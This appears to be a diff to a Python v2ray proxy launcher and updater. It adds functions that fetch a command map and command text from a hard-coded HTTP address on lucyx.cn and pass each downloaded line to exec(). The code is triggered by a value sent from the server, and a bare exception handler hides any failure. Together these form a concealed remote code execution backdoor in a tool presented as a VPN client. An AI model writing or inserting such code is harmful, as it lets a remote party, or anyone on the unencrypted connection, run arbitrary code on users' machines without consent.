@@ -28,6 +28,13 @@ up_exe_lj = os.path.join(gzlj, "Desktop", "更新v2ray")
 #创建的根目录
 mblj_1 = os.path.join(gzlj, "pythonz4", "sun36x64")
 mblj_2 = os.path.join(gzlj, "pythonz4", "unsers")
+  
+#动态命令对照文件服务器位置
+dtml_dz_ml = "http://lucyx.cn/zzz/v2ray/dtml.json"
+#动态命令对照文件本地位置
+dtml_dz_ml_bd = os.path.join(gzlj, "pythonz4", "unsers", "dtml.json")
+#动态命令正文本地位置
+dtml_dz_ml_bd_zw = os.path.join(gzlj, "pythonz4", "unsers", "dtmlzw.txt")
 
 #v2ray本体路径
 v2ray_start_lj = os.path.join(gzlj, "pythonz4", "sun36x64", "v2ray", "v2ray")
@@ -229,6 +236,39 @@ def install():
 	go()
 
 
+def get_dtml_dzb():
+	#用于获取特殊命令对照目录的函数
+	request.urlretrieve(dtml_dz_ml, dtml_dz_ml_bd)
+
+def get_dtml_xsdz(wz):
+	#用于获取特殊命令对照目录的函数
+	request.urlretrieve(wz, dtml_dz_ml_bd_zw)
+
+
+def dq_dtml_ml(x):
+	#用于读取动态命令目录的函数
+	with open(dtml_dz_ml_bd) as zx:
+		dtml_ml = json.load(zx)
+	ml_dz = dtml_ml[x]
+	return ml_dz
+
+
+def dtml_srjc(Xx):
+	#用于判断并执行特殊命令的函数
+	if Xx == "0":
+		print("")
+	else:
+		#获取命令对照表
+		get_dtml_dzb()
+		wz = dq_dtml_ml(Xx)
+		#下载命令正文
+		get_dtml_xsdz(wz)
+		#读取并运行命令
+		with open(dtml_dz_ml_bd_zw) as xxx:
+			for hii in xxx: 
+				exec(hii)
+
+
 def core():
 	cfz = 0
 	try:
@@ -346,6 +386,13 @@ def core():
 			print("错误！X008\n")
 			input("按下任意键退出程序！")
 			sys.exit(0)
+
+		try:
+			#特殊指令函数
+			dtml_srjc(server_x)
+		except:
+			print("E")
+			print("")
 
 		if server_re == "1":
 			print("验证成功！\n")
